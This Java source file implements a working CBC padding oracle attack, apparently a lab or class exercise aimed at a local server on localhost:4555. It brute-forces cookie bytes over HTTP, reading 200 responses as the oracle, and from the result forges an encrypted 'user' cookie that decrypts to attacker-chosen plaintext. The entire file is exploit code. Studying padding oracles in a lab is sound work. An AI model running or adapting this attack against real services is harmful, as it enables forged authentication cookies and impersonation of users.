import javax.xml.bind.DatatypeConverter;
import java.io.IOException;
import java.math.BigInteger;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;

public class Encrypt {

    public static void main(String[] args) throws IOException, InterruptedException {
        String plainText = args[0];
        URL url = new URL("http://localhost:4555/");

        String hexText = String.format("%02x", new BigInteger(1, plainText.getBytes()));
        int numBytes = hexText.length()/2;

        int p = 1;
        int numPad = 0;
        while (true) {
            if(numBytes > p*16)
                p++;
            else {
                numPad = p*16 - numBytes;
                break;
            }
        }

        // Pad the plaintext
        for (int i = 1; i < numPad; i++) {
            hexText = hexText.concat(String.format("%02x", numPad - i));
        }
        hexText = hexText.concat(String.format("%02x", numPad));

        //System.err.println(hexText);
        //System.err.println(numBytes);
        //System.err.println(numPad);

        int numBlocks = hexText.length() / 32;

        String C1hexString = "";
        String C2 = String.format("%032x", 1565543186);
        C1hexString = C1hexString.concat(C2);

        for (int a = numBlocks; a >= 1 ; a--) {
            String P2String = hexText.substring((a-1)*32, a*32);

            int C1p[] = new int[16];    // C1 that we chose
            int C1[] = new int[16];     // cyphertext
            int I2[] = new int[16];     // intermediary
            int P2target[] = new int[16];     // plaintext to be encrypted
            int P2p[] = new int[16];    // padding

            // First find the last byte
            for (int i = 255; i >= 0; i--) {
                C1p[15] = i ^ 0;
                String hexIV = String.format("%030X", 0).concat(String.format("%02X", C1p[15]));
                String cookieAttempt = hexIV.concat(C1hexString.substring(0,32));
                //System.err.println("Block " + a + " cookieAttempt: " + cookieAttempt);

                byte[] substringDecoded = DatatypeConverter.parseHexBinary(cookieAttempt);
                String substringEncoded = DatatypeConverter.printBase64Binary(substringDecoded);

                URLConnection uc = url.openConnection();
                uc.setRequestProperty("Cookie", "user=" + substringEncoded);
                //uc.connect();

                String server = uc.getHeaderField(0);   // Get response header
                //System.err.println(server.toString());  // Output the response

                if (server.contains("200")) {
                    I2[15] = C1p[15] ^ 1;   // We know the last byte of padding will be 1
                    P2target[15] = Integer.parseInt(P2String.substring(30, 32), 16);
                    C1[15] = I2[15] ^ P2target[15];
                    break;
                }
            }

            // Now iterate backwards over the rest
            for (int i = 2; i <= 16; i++) {
                P2p[15] = i ^ 0;
                // Create proper padding that can be accepted
                for (int j = 14; j >= 16 - i; j--) {
                    P2p[j] = 15 - j;
                }
                // Set IV up to this iteration according to padding, we will set this one (C1p[i]) in the loop
                for (int j = 15; j >= 16 - i + 1; j--) {
                    C1p[j] = P2p[j] ^ I2[j];
                }

                // Create cookie attempt, including setting up this iteration for C1p
                for (int j = 255; j >= 0; j--) {
                    C1p[16 - i] = j;
                    String C1pString = String.format("%0" + (34 - (i * 2)) + "X", C1p[16 - i]);
                    for (int k = 1; k < i; k++) {
                        C1pString = C1pString.concat(String.format("%02X", C1p[16 - i + k]));
                    }
                    String cookieAttempt = C1pString.concat(C1hexString.substring(0,32));
                    //System.err.println("Block " + a + " cookieAttempt: " + cookieAttempt);

                    byte[] substringDecoded = DatatypeConverter.parseHexBinary(cookieAttempt);
                    String substringEncoded = DatatypeConverter.printBase64Binary(substringDecoded);

                    URLConnection uc = url.openConnection();
                    uc.setRequestProperty("Cookie", "user=" + substringEncoded);
                    //uc.connect();

                    String server = uc.getHeaderField(0);   // Get response header
                    //System.out.println(server.toString());  // Output the response

                    if (server.contains("200")) {
                        I2[16 - i] = C1p[16 - i] ^ P2p[16 - i];
                        P2target[16 - i] = Integer.parseInt(P2String.substring(32 - (i * 2), 34 - (i * 2)), 16);
                        C1[16 - i] = I2[16 - i] ^ P2target[16 - i];
                        break;
                    }
                }
            }
            for (int i = 15; i >= 0; i--) {
                C1hexString = String.format("%02X", C1[i]).concat(C1hexString);
            }
        }

        byte[] substringDecoded = DatatypeConverter.parseHexBinary(C1hexString);
        String substringEncoded = DatatypeConverter.printBase64Binary(substringDecoded);
        System.out.println(substringEncoded);

    }
}
